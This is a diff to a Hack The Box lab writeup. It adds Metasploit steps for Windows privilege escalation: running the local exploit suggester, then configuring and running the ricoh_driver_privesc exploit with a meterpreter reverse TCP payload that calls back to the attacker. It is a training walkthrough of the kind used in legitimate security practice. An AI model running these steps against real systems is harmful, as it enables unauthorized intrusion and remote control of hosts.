@@ -281,7 +281,7 @@ meterpreter > migrate 1864
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/362b2c35-6f96-4096-8c44-3372d3e60f01)
 
 Using Exploit Suggestor
-```
+```CSS
 meterpreter > {BACKGROUND SESSESION - HIT CTRL + Z}
 Background session 1? [y/N]  
 msf6 exploit(multi/handler) > use multi/recon/local_exploit_suggester
@@ -290,3 +290,29 @@ session => 1
 msf6 post(multi/recon/local_exploit_suggester) > run
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/7f23ae4e-3606-4847-86bf-59c0581a82c6)
+
+Expoits Found
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/fdee8bf1-97ad-426d-a47b-42568541d6bc)
+
+Use Exploit for Privilege Escalation
+- Configure Exploit
+```CSS
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ricoh_driver_privesc
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+msf6 exploit(windows/local/ricoh_driver_privesc) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+
+msf6 exploit(windows/local/ricoh_driver_privesc) > set session 1
+session => 1
+
+msf6 exploit(windows/local/ricoh_driver_privesc) > set lhost tun0
+lhost => tun0
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b0bb7cfc-10aa-46e4-b144-7d25c2c189d4)
+
+Run the Exploit
+```CSS
+msf6 exploit(windows/local/ricoh_driver_privesc) > run
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/90c0e117-6216-49a2-b149-c348ca38d951)
